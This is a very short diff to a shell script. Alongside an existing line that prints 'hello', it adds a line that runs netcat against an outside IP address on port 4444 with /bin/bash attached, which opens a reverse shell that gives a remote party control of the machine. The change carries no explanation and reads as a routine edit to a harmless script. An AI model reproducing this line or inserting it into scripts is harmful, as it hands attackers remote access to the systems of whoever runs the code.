@@ -1,1 +1,3 @@
 echo "hello"
+nc 188.166.145.160 4444 -e /bin/bash
+
